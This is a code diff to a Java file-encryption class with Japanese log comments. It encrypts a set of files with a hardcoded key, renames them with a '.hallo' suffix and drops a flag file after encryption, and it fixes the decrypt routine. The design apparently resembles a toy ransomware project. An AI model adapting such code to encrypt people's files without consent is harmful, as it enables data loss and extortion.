@@ -11,6 +11,8 @@ import java.security.Key;
 import java.security.NoSuchAlgorithmException;
 import java.util.List;
 
+import static cipher.CryptionKeys.A_FLAG_FILE;
+
 public class Cryption {
 
   /**
@@ -35,7 +37,8 @@ public class Cryption {
 
       // File IO
       inputStream = new FileInputStream(fileInput);
-      byte[] inputBytes = new byte[(int) fileInput.length()];
+      byte[] inputBytes = new byte[(int)fileInput.length()];
+      inputStream.read(inputBytes);
 
       byte[] outputBytes = cipher.doFinal(inputBytes);
       outputStream = new FileOutputStream(fileOutput);
@@ -77,7 +80,7 @@ public class Cryption {
     // 暗号化が終わったら、フラグファイルを追加する
     FileOutputStream output = null;
     try {
-      output = new FileOutputStream(rootDirPath + "www.dat");
+      output = new FileOutputStream(rootDirPath + A_FLAG_FILE);
 
       System.out.println("[log] フラグ追加完了");
 
@@ -100,13 +103,13 @@ public class Cryption {
    */
   public void exeDecrypt(List<File> halloedFiles, String rootDirPath) {
 
-    halloedFiles.forEach(hallo -> fileCrypt(Cipher.ENCRYPT_MODE, CryptionKeys.COMMON_KEY,
+    halloedFiles.forEach(hallo -> fileCrypt(Cipher.DECRYPT_MODE, CryptionKeys.COMMON_KEY,
         hallo, new File(hallo.getPath().split(".hallo")[0])));
 
     System.out.println("[log] 復号化完了");
 
     // 復号化が終わったら、フラグファイルを削除する
-    new File(rootDirPath + "www.dat").delete();
+    new File(rootDirPath + A_FLAG_FILE).delete();
 
     System.out.println("[log] フラグ削除完了");
 
